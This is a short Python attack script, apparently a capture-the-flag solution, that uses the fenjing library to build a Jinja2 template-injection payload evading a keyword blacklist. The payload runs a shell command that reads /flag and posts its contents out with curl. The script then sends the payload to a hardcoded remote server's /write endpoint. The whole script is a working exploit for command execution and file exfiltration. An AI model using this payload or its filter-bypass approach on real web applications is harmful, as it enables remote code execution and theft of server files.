import requests
from fenjing import exec_cmd_payload, config_payload
import re

def waf(s: str):
    blacklist = [
    r'__', r'\.', r'\[', r'\]', r'\+',
    r'request', r'config', r'os', r'subprocess',
    r'import', r'init', r'globals', r'open', r'read', r'mro', r'class'
]
    return not any(re.search(b, s, re.IGNORECASE) for b in blacklist)

if __name__ == "__main__":
    shell_payload, _ = exec_cmd_payload(waf, 'curl -X POST -F "title=$(cat /flag)" -F "content=test1" http://localhost:5000/accept')
    config_payload = config_payload(waf)


URL = "http://13.125.147.151:5000"

r = requests.post(f"{URL}/write", data={
    "title": "Test",
    "content": shell_payload
})